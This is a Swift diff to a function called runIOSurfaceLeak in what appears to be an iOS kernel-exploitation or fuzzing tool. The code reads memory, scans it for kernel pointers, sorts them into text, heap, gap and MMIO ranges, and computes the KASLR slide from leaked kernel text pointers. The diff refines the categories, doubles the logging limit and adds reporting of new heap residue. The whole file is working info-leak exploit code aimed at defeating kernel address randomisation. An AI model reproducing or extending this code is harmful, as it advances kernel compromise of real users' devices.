@@ -1818,28 +1818,31 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                                   &outBytes)
             }
             guard kr == 0 else { step("  \(label): vm_read kr=\(kr)"); return }
-            var found = 0, ktext = 0, kheap = 0, kmmio = 0
+            var found = 0, ktext = 0, kheap = 0, kmmio = 0, kgap = 0
             for qw in 0..<(Int(outBytes) / 8) {
                 var val: UInt64 = 0
                 for b in 0..<8 { val |= UInt64(buf[qw*8 + b]) << (b*8) }
                 guard val >= 0xFFFFFE0000000000 && val != 0xFFFFFFFFFFFFFFFF else { continue }
                 let b0 = UInt8(val & 0xFF)
                 guard val != UInt64(b0) &* 0x0101010101010101 else { continue }
+                guard (val & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
                 let unslidBase: UInt64 = 0xFFFFFFF007004000
                 let slide = val &- unslidBase
                 let cat: String
                 if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && (val & 3) == 0 && slide <= 0x80000000 {
                     cat = "KTEXT"; ktext += 1
-                } else if val < 0xFFFFFFF000000000 {
+                } else if val >= 0xFFFFFFF080000000 {
+                    cat = "KMMIO"; kmmio += 1
+                } else if val >= 0xFFFFFE0000000000 && val <= 0xFFFFFEFFFFFFFFFF {
                     cat = "KHEAP"; kheap += 1
                 } else {
-                    cat = "KMMIO"; kmmio += 1
+                    cat = "KGAP"; kgap += 1
                 }
                 step("  \(label)[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16)) [\(cat)]")
                 found += 1
-                if found >= 60 { step("  ...clipped at 60"); break }
+                if found >= 120 { step("  ...clipped at 120"); break }
             }
-            step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KMMIO=\(kmmio)")
+            step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KGAP=\(kgap) KMMIO=\(kmmio)")
         }
 
         let base = UInt(bitPattern: baseAddr)
@@ -1883,7 +1886,7 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 //   KTEXT  0xFFFFFFF000000000–0xFFFFFFF07FFFFFFF, 4-byte aligned (real code ptr)
                 //   KTEXTD 0xFFFFFFF000000000–0xFFFFFFF07FFFFFFF, NOT aligned (data in text range)
                 //   KHEAP  0xFFFFFE0000000000–0xFFFFFEFFFFFFFFFF  (XNU zone heap, KASLR-sensitive)
-                //   KGAP   0xFFFFFF0000000000–0xFFFFFEFFFFFFFFFF  (driver/iommu gap)
+                //   KGAP   0xFFFFFF0000000000–0xFFFFFFF000000000  (driver/iommu gap, above KHEAP)
                 //   KMMIO  0xFFFFFFF080000000+                     (IOKit HW regs, fixed)
                 let cat: String
                 if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
@@ -1926,6 +1929,31 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 }
             } else {
                 step("RECURRING: none yet (run \(_iosurfRunCount)) — keep tapping")
+            }
+
+            // First-time values this run — most likely actual varied kernel heap residue
+            let novelVals = seenThisRun.filter { _iosurfValFreq[$0] == 1 }.sorted()
+            if !novelVals.isEmpty {
+                step("NOVEL THIS RUN (\(novelVals.count) first-time values — transient heap residue):")
+                for v in novelVals {
+                    let cat2: String
+                    if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
+                        cat2 = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
+                    } else if v >= 0xFFFFFFF080000000 {
+                        cat2 = "KMMIO"
+                    } else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF {
+                        cat2 = "KHEAP"
+                    } else {
+                        cat2 = "KGAP"
+                    }
+                    let unslidBase2: UInt64 = 0xFFFFFFF007004000
+                    var extra2 = ""
+                    if cat2 == "KTEXT" {
+                        let slide2 = v &- unslidBase2
+                        if slide2 <= 0x80000000 { extra2 = " *** KASLR slide=0x\(String(slide2,radix:16))" }
+                    }
+                    step("  ★ 0x\(String(v,radix:16)) [\(cat2)]\(extra2)")
+                }
             }
 
             _iosurfPrevTailValues = currentPairs
